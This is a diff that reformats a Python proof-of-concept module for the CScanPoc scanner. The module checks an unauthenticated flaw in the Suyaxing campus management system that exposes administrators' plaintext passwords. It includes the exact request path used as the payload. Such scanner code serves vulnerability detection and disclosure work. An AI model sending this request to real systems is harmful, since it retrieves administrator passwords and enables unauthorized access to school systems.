@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Suyaxing_0001' # 平台漏洞编号，留空
+    vuln_id = 'Suyaxing_0001'  # 平台漏洞编号，留空
     name = '苏亚星校园管理系统 信息泄露'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INFO_LEAK # 漏洞类型
+    type = VulnType.INFO_LEAK  # 漏洞类型
     disclosure_date = '2015-01-08'  # 漏洞公布时间
     desc = '''
         南京苏亚星校园管理系统设计缺陷导致获取任意管理员明文密码（无需登录）。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '苏亚星校园管理系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版
+
 
 class Poc(ABPoc):
     poc_id = '4c35be40-cfbd-4b5d-945e-1612acb52890'
@@ -30,8 +32,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #Refer http://www.wooyun.org/bugs/wooyun-2010-090403
+
+            # Refer http://www.wooyun.org/bugs/wooyun-2010-090403
             payload = '/ws2004/SysManage/UserManage/SysManage/editxml.asp?ID=1'
             #code, head, res, errcode, _ = curl.curl2(arg+payload)
             r = requests.get(self.target + payload)
@@ -46,6 +48,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
